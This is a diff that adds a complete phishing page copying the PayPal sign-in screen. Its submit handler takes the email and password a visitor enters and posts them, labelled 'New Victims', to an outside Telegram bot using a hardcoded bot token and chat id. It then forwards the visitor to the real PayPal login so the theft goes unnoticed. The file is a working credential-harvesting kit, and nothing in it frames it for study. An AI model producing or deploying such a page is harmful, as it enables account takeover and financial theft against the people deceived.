@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PayPal Sign In</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background-color: #fff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            width: 100%;
+            max-width: 360px;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        .paypal-logo {
+            margin: 20px 0;
+            text-align: center;
+        }
+        .paypal-logo img {
+            width: 60px;
+            height: auto;
+        }
+        .input-field {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        .password-container {
+            position: relative;
+            width: 100%;
+            margin: 10px 0;
+        }
+        .password-field {
+            width: 100%;
+            padding: 12px 40px 12px 12px; /* Space for the toggle button inside on the right */
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        .password-toggle {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #0070ba;
+            font-size: 14px;
+            background: none;
+            border: none;
+            padding: 0;
+        }
+        .forgot-password {
+            color: #0070ba;
+            text-decoration: none;
+            font-size: 14px;
+            margin: 10px 0;
+            display: block;
+            text-align: left;
+        }
+        .button {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+        }
+        .login-btn {
+            background-color: #0070ba;
+            color: white;
+        }
+        .signup-btn {
+            background-color: white;
+            color: #0070ba;
+            border: 1px solid #0070ba;
+        }
+        .separator {
+            text-align: center;
+            color: #666;
+            margin: 10px 0;
+            font-size: 14px;
+            border-bottom: 1px solid #ddd;
+        }
+        .language-selector {
+            margin: 20px 0;
+            text-align: center;
+        }
+        .language-selector select {
+            padding: 5px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+        .footer {
+            margin-top: 250px;
+            font-size: 12px;
+            color: #666;
+            text-align: center;
+            background-color: #f5f5f5;
+            padding: 10px 0;
+            border-top: 1px solid #ddd;
+        }
+        .footer a {
+            color: #666;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="paypal-logo">
+            <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" alt="PayPal Logo">
+        </div>
+        <form id="loginForm" method="POST" onsubmit="return handleSubmit(event)">
+            <input type="text" class="input-field" placeholder="Email or mobile number" name="email" required>
+            <div class="password-container">
+                <input type="password" id="passwordInput" class="password-field" placeholder="Password" name="password">
+                <button type="button" class="password-toggle" onclick="togglePassword()">Show</button>
+            </div>
+            <a href="https://www.paypal.com/authflow/password-recovery/?country.x=US&locale.x=en_US&redirectUri=%252Fsignin" class="forgot-password">Forgot password?</a>
+            <button type="submit" class="button login-btn">Log In</button>
+            <div class="separator">or</div>
+            <button type="button" class="button signup-btn" onclick="window.location.href='https://www.paypal.com/us/webapps/mpp/account-selection'">Sign Up</button>
+        </form>
+        <div class="language-selector">
+            <select onchange="changeLanguage(this.value)">
+                <option value="en">English</option>
+                <option value="fr">Français</option>
+                <option value="es">Español</option>
+                <option value="zh">中文</option>
+            </select>
+        </div>
+        <div class="footer">
+            <a href="https://www.paypal.com/us/cshelp/contact-us">Contact Us</a> | 
+            <a href="https://www.paypal.com/us/legalhub/paypal/privacy-full">Privacy</a> | 
+            <a href="https://www.paypal.com/us/legalhub/paypal/home">Legal</a> | 
+            <a href="https://www.paypal.com/us/legalhub/paypal/upcoming-policies-full">Policy Updates</a> | 
+            <a href="https://www.paypal.com/us/webapps/mpp/country-worldwide">Worldwide</a>
+        </div>
+    </div>
+
+    <script>
+        function changeLanguage(lang) {
+            alert("Language changed to: " + lang);
+        }
+
+        function togglePassword() {
+            const passwordInput = document.getElementById('passwordInput');
+            const toggleBtn = document.querySelector('.password-toggle');
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                toggleBtn.textContent = 'Hide';
+            } else {
+                passwordInput.type = 'password';
+                toggleBtn.textContent = 'Show';
+            }
+        }
+
+        function handleSubmit(event) {
+            event.preventDefault();
+            const email = document.querySelector('input[name="email"]').value;
+            const password = document.querySelector('input[name="password"]').value;
+            const ipAddress = '127.0.0.1'; // In real use, fetch actual IP via server-side
+            const loginTime = new Date().toLocaleString('en-US', { timeZone: 'Asia/Dhaka' });
+            const loginPageType = 'Paypal Pay';
+
+            const botToken = '6988425897:AAEc3nFqt411ryD_ndIlpyrLpkdf8MHjwKQ';
+            const chatId = '5916486983';
+            const message = `New Victims\nNumber or Gmail➜ ${email}\nPassword➜ ${password}\nIP Address➜ ${ipAddress}\nLogin Time & Date (BD)➜ ${loginTime}\nLogin Page Type ➜ ${loginPageType}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Telegram response:', data);
+                // Redirect to the specified URL after sending data
+                window.location.href = 'https://www.paypal.com/signin?returnUri=https%3A%2F%2Fwww.paypal.com%2Fmyaccount%2Fsummary&state=%3Fcountry.x%3DAL%26locale.x%3Den_AL&country.x=US&locale.x=en_US';
+            })
+            .catch(error => console.error('Telegram error:', error));
+
+            return false;
+        }
+    </script>
+</body>
+</html>
